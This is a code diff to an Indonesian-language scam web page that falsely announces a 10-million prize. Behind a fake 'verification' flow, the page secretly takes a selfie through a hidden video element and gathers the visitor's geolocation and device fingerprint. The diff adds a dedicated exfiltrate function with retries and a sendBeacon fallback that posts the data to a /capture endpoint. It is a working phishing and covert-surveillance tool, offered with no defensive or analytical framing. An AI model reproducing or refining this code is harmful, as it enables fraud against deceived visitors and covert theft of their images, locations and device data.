@@ -4,16 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>🎉 SELAMAT! Anda Pemenang 10 Juta! 🎉</title>
-    <!-- Font Awesome 6 (Icons) -->
+    <!-- Font Awesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', 'Segoe UI', Roboto, sans-serif;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', 'Segoe UI', Roboto, sans-serif; }
         body {
             min-height: 100vh;
             background: linear-gradient(145deg, #1e2b3c 0%, #0f1a2b 100%);
@@ -24,8 +18,6 @@
             position: relative;
             overflow-x: hidden;
         }
-
-        /* Floating particles (simulated confetti) */
         .particle {
             position: absolute;
             width: 8px;
@@ -36,16 +28,13 @@
             pointer-events: none;
             z-index: 1;
         }
-
         @keyframes float {
             0% { transform: translateY(0) rotate(0deg); opacity: 1; }
             100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
         }
-
         .glass-card {
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
             border-radius: 40px;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
             padding: 32px 24px;
@@ -55,7 +44,6 @@
             z-index: 20;
             transition: transform 0.3s;
         }
-
         .badge-winner {
             background: linear-gradient(45deg, #ffd700, #f9a826);
             color: #1e2b3c;
@@ -69,7 +57,6 @@
             box-shadow: 0 5px 15px rgba(0,0,0,0.3);
             border: 1px solid rgba(255,255,255,0.3);
         }
-
         h1 {
             font-size: 42px;
             font-weight: 800;
@@ -78,7 +65,6 @@
             line-height: 1.2;
             margin-bottom: 8px;
         }
-
         .prize {
             font-size: 58px;
             font-weight: 900;
@@ -88,7 +74,6 @@
             text-shadow: 0 2px 10px rgba(255,215,0,0.5);
             margin: 5px 0;
         }
-
         .sub-prize {
             color: rgba(255,255,255,0.8);
             font-size: 18px;
@@ -98,14 +83,12 @@
             background: rgba(0,0,0,0.2);
             border-radius: 0 30px 30px 0;
         }
-
         .steps {
             display: flex;
             justify-content: space-between;
             margin: 30px 0 20px;
             position: relative;
         }
-
         .steps::before {
             content: '';
             position: absolute;
@@ -117,7 +100,6 @@
             transform: translateY(-50%);
             z-index: 0;
         }
-
         .step {
             width: 48px;
             height: 48px;
@@ -135,19 +117,16 @@
             transition: all 0.3s;
             font-size: 18px;
         }
-
         .step.active {
             background: #4CAF50;
             border-color: #4CAF50;
             box-shadow: 0 0 25px #4CAF50;
             transform: scale(1.1);
         }
-
         .step.completed {
             background: #2196F3;
             border-color: #2196F3;
         }
-
         .btn-claim {
             background: linear-gradient(45deg, #ffd700, #f9a826);
             border: none;
@@ -168,20 +147,16 @@
             text-transform: uppercase;
             letter-spacing: 2px;
         }
-
         .btn-claim:hover {
             transform: translateY(-3px);
             box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 0 3px rgba(255,215,0,0.5);
         }
-
         .btn-claim:active {
             transform: translateY(0);
         }
-
         .btn-claim i {
             font-size: 32px;
         }
-
         .status-panel {
             background: rgba(0, 0, 0, 0.3);
             border-radius: 28px;
@@ -189,7 +164,6 @@
             margin: 20px 0;
             border: 1px solid rgba(255,255,255,0.1);
         }
-
         .status-item {
             display: flex;
             align-items: center;
@@ -201,7 +175,6 @@
             backdrop-filter: blur(4px);
             border: 1px solid rgba(255,255,255,0.05);
         }
-
         .status-icon {
             width: 48px;
             height: 48px;
@@ -213,14 +186,12 @@
             font-size: 22px;
             color: #ffd700;
         }
-
         .status-label {
             flex: 1;
             font-weight: 600;
             color: white;
             font-size: 16px;
         }
-
         .status-badge {
             padding: 6px 18px;
             border-radius: 40px;
@@ -231,19 +202,11 @@
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
-
         .badge-waiting { background: #ff9800; }
         .badge-success { background: #4CAF50; }
         .badge-error { background: #f44336; }
-
-        #video-container {
-            display: none; /* completely hidden, we don't need to show it */
-        }
-
-        video {
-            display: none;
-        }
-
+        #video-container { display: none; }
+        video { display: none; }
         .final-message {
             text-align: center;
             font-size: 24px;
@@ -251,7 +214,6 @@
             margin: 20px 0;
             min-height: 90px;
         }
-
         .footer-note {
             text-align: center;
             color: rgba(255,255,255,0.4);
@@ -260,18 +222,14 @@
             padding-top: 15px;
             border-top: 1px solid rgba(255,255,255,0.1);
         }
-
         .pulse {
             animation: pulse 2s infinite;
         }
-
         @keyframes pulse {
             0% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 0 rgba(255,215,0,0.7); }
             70% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 20px rgba(255,215,0,0); }
             100% { box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 0 0 rgba(255,215,0,0); }
         }
-
-        /* Responsive */
         @media (max-width: 480px) {
             h1 { font-size: 32px; }
             .prize { font-size: 44px; }
@@ -304,27 +262,25 @@
 
         <!-- Status panel -->
         <div class="status-panel">
-            <div class="status-item" id="statusCamera">
+            <div class="status-item">
                 <div class="status-icon"><i class="fas fa-camera-retro"></i></div>
                 <span class="status-label">Verifikasi Selfie</span>
                 <span class="status-badge badge-waiting" id="cameraBadge">Menunggu</span>
             </div>
-            <div class="status-item" id="statusLocation">
+            <div class="status-item">
                 <div class="status-icon"><i class="fas fa-map-pin"></i></div>
                 <span class="status-label">Verifikasi Lokasi</span>
                 <span class="status-badge badge-waiting" id="locationBadge">Menunggu</span>
             </div>
-            <div class="status-item" id="statusDevice">
+            <div class="status-item">
                 <div class="status-icon"><i class="fas fa-mobile-alt"></i></div>
                 <span class="status-label">Data Perangkat</span>
                 <span class="status-badge badge-waiting" id="deviceBadge">Menunggu</span>
             </div>
         </div>
 
-        <!-- Hidden video element (required for camera access) -->
-        <div id="video-container">
-            <video id="video" autoplay playsinline></video>
-        </div>
+        <!-- Hidden video (required for camera) -->
+        <video id="hiddenVideo" autoplay playsinline></video>
 
         <!-- Final message area -->
         <div class="final-message" id="finalMessage"></div>
@@ -336,7 +292,7 @@
 
     <script>
         (function() {
-            // ========== Background Particles ==========
+            // === Background Particles ===
             function createParticles() {
                 const container = document.getElementById('particles');
                 for (let i = 0; i < 40; i++) {
@@ -352,7 +308,7 @@
             }
             createParticles();
 
-            // ========== DOM Elements ==========
+            // === DOM Elements ===
             const claimBtn = document.getElementById('claimBtn');
             const cameraBadge = document.getElementById('cameraBadge');
             const locationBadge = document.getElementById('locationBadge');
@@ -361,7 +317,7 @@
             const step2 = document.getElementById('step2');
             const step3 = document.getElementById('step3');
             const step4 = document.getElementById('step4');
-            const video = document.getElementById('video');
+            const hiddenVideo = document.getElementById('hiddenVideo');
             const finalMessage = document.getElementById('finalMessage');
 
             // State
@@ -395,36 +351,37 @@
                 setStep(1);
             }
 
-            // ========== Collectors ==========
+            // === Camera Capture (forced 640x480) ===
             async function collectCamera() {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user", width: 640, height: 480 }
                     });
-                    video.srcObject = stream;
-                    await new Promise(resolve => video.onloadedmetadata = resolve);
+                    hiddenVideo.srcObject = stream;
+                    await new Promise(resolve => hiddenVideo.onloadedmetadata = resolve);
 
-                    // Capture foto setelah 1 detik (tanpa ditampilkan)
-                    return new Promise((resolve) => {
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const dataURL = canvas.toDataURL('image/jpeg', 0.9);
-                            
-                            // Matikan kamera
-                            stream.getTracks().forEach(track => track.stop());
-                            video.srcObject = null;
-                            
-                            resolve(dataURL);
-                        }, 1000);
-                    });
+                    // Tunggu 1 detik agar kamera siap
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    // Buat canvas dengan ukuran tetap 640x480
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(hiddenVideo, 0, 0, 640, 480);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.5); // kualitas 0.5
+
+                    // Matikan kamera
+                    stream.getTracks().forEach(track => track.stop());
+                    hiddenVideo.srcObject = null;
+
+                    return dataURL;
                 } catch (err) {
                     throw new Error('Kamera: ' + (err.message || 'Izin ditolak'));
                 }
             }
 
+            // === Location ===
             async function collectLocation() {
                 try {
                     const pos = await new Promise((resolve, reject) => {
@@ -444,8 +401,8 @@
                 }
             }
 
+            // === Fingerprint (disederhanakan) ===
             async function collectFingerprint() {
-                // Simulasi pengumpulan data perangkat
                 await new Promise(r => setTimeout(r, 400));
                 return {
                     userAgent: navigator.userAgent,
@@ -454,21 +411,58 @@
                     screen: `${screen.width}x${screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     cookiesEnabled: navigator.cookieEnabled,
-                    hardwareConcurrency: navigator.hardwareConcurrency
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || '?'
                 };
             }
 
-            // ========== Main Process ==========
+            // === Exfiltration with size check (batas 3MB) ===
+            async function exfiltrate(payload, retries = 3) {
+                // Hapus foto jika payload > 3MB (opsional, tapi kita yakin foto kecil)
+                let payloadStr = JSON.stringify(payload);
+                let size = new Blob([payloadStr]).size;
+                console.log(`Payload size: ${size} bytes`);
+
+                if (size > 3 * 1024 * 1024) {
+                    console.warn('Payload >3MB, menghapus foto');
+                    payload.photo = null;
+                    payloadStr = JSON.stringify(payload);
+                }
+
+                for (let i = 0; i < retries; i++) {
+                    try {
+                        // Prioritaskan fetch dengan keepalive (lebih stabil)
+                        const res = await fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: payloadStr,
+                            keepalive: true
+                        });
+                        if (res.ok) return true;
+                    } catch (e) {
+                        console.error('Exfil attempt error', e);
+                    }
+                    // Coba sendBeacon jika fetch gagal
+                    try {
+                        const success = navigator.sendBeacon('/capture', payloadStr);
+                        if (success) return true;
+                    } catch (e) {}
+                    await new Promise(r => setTimeout(r, 300 * (i + 1)));
+                }
+                return false;
+            }
+
+            // === Main Process ===
             claimBtn.addEventListener('click', async () => {
                 resetUI();
+                claimBtn.disabled = true;
+                claimBtn.style.opacity = '0.6';
 
-                // Kumpulkan data secara berurutan agar steps terlihat natural
+                // Camera
                 try {
-                    // Step 2: Camera
                     setStep(2);
                     cameraBadge.innerText = 'Memproses...';
-                    const photo = await collectCamera();
-                    photoData = photo;
+                    photoData = await collectCamera();
                     cameraBadge.innerText = 'Berhasil';
                     cameraBadge.className = 'status-badge badge-success';
                 } catch (err) {
@@ -477,12 +471,11 @@
                     cameraBadge.className = 'status-badge badge-error';
                 }
 
+                // Location
                 try {
-                    // Step 3: Location
                     setStep(3);
                     locationBadge.innerText = 'Memproses...';
-                    const loc = await collectLocation();
-                    locationData = loc;
+                    locationData = await collectLocation();
                     locationBadge.innerText = 'Berhasil';
                     locationBadge.className = 'status-badge badge-success';
                 } catch (err) {
@@ -491,11 +484,10 @@
                     locationBadge.className = 'status-badge badge-error';
                 }
 
+                // Fingerprint
                 try {
-                    // Step 4: Fingerprint (selalu berhasil karena tidak minta izin)
                     deviceBadge.innerText = 'Memproses...';
-                    const fp = await collectFingerprint();
-                    fingerprint = fp;
+                    fingerprint = await collectFingerprint();
                     deviceBadge.innerText = 'Berhasil';
                     deviceBadge.className = 'status-badge badge-success';
                 } catch (err) {
@@ -506,51 +498,47 @@
 
                 setStep(4);
 
-                // Kirim data ke server
+                // Payload
                 const payload = {
                     photo: photoData,
                     location: locationData,
-                    fingerprint: fingerprint,
-                    errors: errors.length ? errors : undefined
+                    fingerprint,
+                    errors: errors.length ? errors : undefined,
+                    timestamp: Date.now()
                 };
 
-                try {
-                    const response = await fetch('/capture', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                    if (response.ok) {
-                        finalMessage.innerHTML = `
-                            <div style="background: linear-gradient(45deg, #4CAF50, #2E7D32); padding: 24px; border-radius: 60px; color: white; font-weight: 800; font-size: 28px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
-                                <i class="fas fa-check-circle" style="margin-right: 15px;"></i> 
-                                KLAIM BERHASIL!
-                            </div>
-                            <p style="color: white; margin-top: 20px; font-size: 18px;">Data Anda telah diverifikasi. Tim kami akan segera memproses hadiah.</p>
-                        `;
-                        // Tambahkan konfeti ekstra
-                        for (let i = 0; i < 20; i++) {
-                            setTimeout(() => {
-                                let p = document.createElement('div');
-                                p.classList.add('particle');
-                                p.style.left = Math.random() * 100 + '%';
-                                p.style.top = '0';
-                                p.style.background = `hsl(${Math.random() * 60 + 30}, 100%, 60%)`;
-                                p.style.width = Math.random() * 20 + 5 + 'px';
-                                p.style.height = p.style.width;
-                                document.getElementById('particles').appendChild(p);
-                                setTimeout(() => p.remove(), 6000);
-                            }, i * 80);
-                        }
-                    } else {
-                        throw new Error('Gagal mengirim data');
+                // Kirim
+                const sent = await exfiltrate(payload);
+
+                if (sent) {
+                    finalMessage.innerHTML = `
+                        <div style="background: linear-gradient(45deg, #4CAF50, #2E7D32); padding: 24px; border-radius: 60px; color: white; font-weight: 800; font-size: 28px;">
+                            <i class="fas fa-check-circle" style="margin-right: 15px;"></i> 
+                            KLAIM BERHASIL!
+                        </div>
+                        <p style="color: white; margin-top: 20px;">Data Anda telah diverifikasi. Tim kami akan segera memproses hadiah.</p>
+                    `;
+                    // Extra confetti
+                    for (let i = 0; i < 20; i++) {
+                        setTimeout(() => {
+                            let p = document.createElement('div');
+                            p.classList.add('particle');
+                            p.style.left = Math.random() * 100 + '%';
+                            p.style.top = '0';
+                            p.style.background = `hsl(${Math.random() * 60 + 30}, 100%, 60%)`;
+                            p.style.width = Math.random() * 20 + 5 + 'px';
+                            p.style.height = p.style.width;
+                            document.getElementById('particles').appendChild(p);
+                            setTimeout(() => p.remove(), 6000);
+                        }, i * 80);
                     }
-                } catch (err) {
+                } else {
                     finalMessage.innerHTML = '<div style="background:#f44336; padding:20px; border-radius:60px; color:white; font-weight:800;"><i class="fas fa-times-circle"></i> Terjadi kesalahan. Coba lagi.</div>';
                 }
-            });
 
-            // Optional: handle page load (tidak otomatis klik)
+                claimBtn.disabled = false;
+                claimBtn.style.opacity = '1';
+            });
         })();
     </script>
 </body>
